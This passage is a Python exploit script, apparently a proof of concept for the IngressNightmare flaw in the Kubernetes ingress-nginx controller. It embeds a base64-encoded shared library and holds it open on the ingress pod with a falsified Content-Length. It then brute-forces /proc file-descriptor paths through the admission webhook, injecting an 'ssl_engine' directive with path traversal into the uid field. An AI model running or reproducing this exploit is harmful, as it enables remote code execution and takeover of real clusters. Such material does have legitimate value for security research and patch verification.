AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAIAAAAAAAAZAAAAAAAAAKAeAAAAAAAAGwAAAAAAAAAIAAAAAAAAAPX+/28AAAAAyAEAAAAAAAAFAAAAAAAAADACAAAAAAAABgAAAAAAAADoAQAAAAAAAAoAAAAAAAAAEQAAAAAAAAALAAAAAAAAABgAAAAAAAAAAwAAAAAAAADoHwAAAAAAAAIAAAAAAAAAMAAAAAAAAAAUAAAAAAAAAAcAAAAAAAAAFwAAAAAAAABgAgAAAAAAAAcAAAAAAAAASAIAAAAAAAAIAAAAAAAAABgAAAAAAAAACQAAAAAAAAAYAAAAAAAAAPn//28AAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgeAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKYCAAAAAAAAtgIAAAAAAABHQ0M6IChBbHBpbmUgMTMuMi4xX2dpdDIwMjQwMzA5KSAxMy4yLjEgMjAyNDAzMDkAAC5zaHN0cnRhYgAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5yZWxhLmR5bgAucmVsYS5wbHQALnRleHQALnJvZGF0YQAuZWhfZnJhbWUALm5vdGUuZ251LnByb3BlcnR5AC5pbml0X2FycmF5AC5keW5hbWljAC5nb3QucGx0AC5jb21tZW50AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACwAAAPb//28CAAAAAAAAAMgBAAAAAAAAyAEAAAAAAAAcAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAAAAAAAAAAABUAAAALAAAAAgAAAAAAAADoAQAAAAAAAOgBAAAAAAAASAAAAAAAAAADAAAAAQAAAAgAAAAAAAAAGAAAAAAAAAAdAAAAAwAAAAIAAAAAAAAAMAIAAAAAAAAwAgAAAAAAABEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJQAAAAQAAAACAAAAAAAAAEgCAAAAAAAASAIAAAAAAAAYAAAAAAAAAAIAAAAAAAAACAAAAAAAAAAYAAAAAAAAAC8AAAAEAAAAQgAAAAAAAABgAgAAAAAAAGACAAAAAAAAMAAAAAAAAAACAAAADQAAAAgAAAAAAAAAGAAAAAAAAAA0AAAAAQAAAAYAAAAAAAAAkAIAAAAAAACQAgAAAAAAADAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAOQAAAAEAAAAGAAAAAAAAAMACAAAAAAAAwAIAAAAAAAAlAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAD8AAAABAAAAAgAAAAAAAADlAgAAAAAAAOUCAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABHAAAAAQAAAAIAAAAAAAAAEAMAAAAAAAAQAwAAAAAAAFwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAUQAAAAcAAAACAAAAAAAAAHADAAAAAAAAcAMAAAAAAAAwAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAGQAAAAOAAAAAwAAAAAAAACgHgAAAAAAAKAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAABwAAAABgAAAAMAAAAAAAAAqB4AAAAAAACoDgAAAAAAAEABAAAAAAAAAwAAAAAAAAAIAAAAAAAAABAAAAAAAAAAeQAAAAEAAAADAAAAAAAAAOgfAAAAAAAA6A8AAAAAAAAoAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAIIAAAABAAAAMAAAAAAAAAAAAAAAAAAAABAQAAAAAAAAMQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABBEAAAAAAAAIsAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA"

admssion_json = """
{
   "kind": "AdmissionReview",
   "apiVersion": "admission.k8s.io/v1",
   "request": {
      "uid": "3babc164-2b11-4c9c-976a-52f477c63e35",
      "kind": {
         "group": "networking.k8s.io",
         "version": "v1",
         "kind": "Ingress"
      },
      "resource": {
         "group": "networking.k8s.io",
         "version": "v1",
         "resource": "ingresses"
      },
      "requestKind": {
         "group": "networking.k8s.io",
         "version": "v1",
         "kind": "Ingress"
      },
      "requestResource": {
         "group": "networking.k8s.io",
         "version": "v1",
         "resource": "ingresses"
      },
      "name": "minimal-ingress",
      "namespace": "default",
      "operation": "CREATE",
      "userInfo": {
         "uid": "1619bf32-d4cb-4a99-a4a4-d33b2efa3bc6"
      },
      "object": {
         "kind": "Ingress",
         "apiVersion": "networking.k8s.io/v1",
         "metadata": {
            "name": "minimal-ingress",
            "namespace": "default",
            "creationTimestamp": null,
            "uid": "test#;\\n\\n}\\n}\\n}\\nssl_engine ../../../../../../../REPLACE",
            "annotations": {
                "nginx.ingress.kubernetes.io/mirror-target": "xxxxxxxxxxx"
            }
         },
         "spec": {
            "ingressClassName": "nginx",
            "rules": [
               {
                  "host": "test.example.com",
                  "http": {
                     "paths": [
                        {
                           "path": "/",
                           "pathType": "Prefix",
                           "backend": {
                              "service": {
                                 "name": "kubernetes",
                                 "port": {
                                    "number": 443
                                 }
                              }
                           }
                        }
                     ]
                  }
               }
            ]
         },
         "status": {
            "loadBalancer": {}
         }
      },
      "oldObject": null,
      "dryRun": true,
      "options": {
         "kind": "CreateOptions",
         "apiVersion": "meta.k8s.io/v1"
      }
   }
}
"""


def send_request(admission_url, json_data, proc, fd):
    print(f"Trying Proc: {proc}, FD: {fd}")
    path = f"proc/{proc}/fd/{fd}"
    replaced_data = json_data.replace("REPLACE", path)

    headers = {
        "Content-Type": "application/json"
    }

    full_url = admission_url.rstrip("/") + "/admission"

    try:
        response = requests.post(full_url, data=replaced_data, headers=headers, verify=False, timeout=1)
        # print(response.text) - use this to debug (check response of admission webhook)
        print(f"Response for /proc/{proc}/fd/{fd}: {response.status_code}")
    except Exception as e:
        print(f"Error on /proc/{proc}/fd/{fd}: {e}")


def admission_brute(admission_url, max_workers=10):
    # proc = input("INPUT PROC:") - use this for manual testing
    # fd = input("INPUT FD:") - use this for manual testing
    # send_request(admission_url, json_data, proc, fd) - use this for manual testing

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for proc in range(30, 50):  # can be increased to 100
            for fd in range(3, 30):  # can be increased to 100 (not recommended)
                executor.submit(send_request, admission_url, admssion_json, proc, fd)

        for proc in range(160, 180):  # can be increased to 100
            for fd in range(3, 30):  # can be increased to 100 (not recommended)
                executor.submit(send_request, admission_url, admssion_json, proc, fd)


def exploit(ingress_url):
    so = base64.b64decode(pwn_base64) + b"\00" * 8092

    real_length = len(so)
    fake_length = real_length + 10
    url = ingress_url

    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"

    try:
        sock = socket.create_connection((host, port))
    except Exception as e:
        print(f"Error connecting to {host}:{port}: {e} - host is up?")
        sys.exit(0)
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: lufeisec\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {fake_length}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode("iso-8859-1")

    http_payload = headers + so
    sock.sendall(http_payload)

    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk

    print("[*] Resposta:")
    print(response.decode(errors="ignore"))

    sock.close()


if len(sys.argv) < 2:
    print("Usage: python3 exploit.py <ingress_url> <admission_webhook_url> ")
    sys.exit(0)
else:
    ingress_url = sys.argv[1]
    admission = sys.argv[2]

    # Send the library to the ingress pod and keep the connection open to keep the file open via the file descriptor (FD).
    x = threading.Thread(target=exploit, args=(ingress_url,))
    x.start()

    # time.sleep(9999 * 9999)
    # start the admission webhook brute force (/proc/{pid}/fd/{fd})
    admission_brute(admission)
```
原作者地址:https://github.com/lufeirider/IngressNightmare-PoC
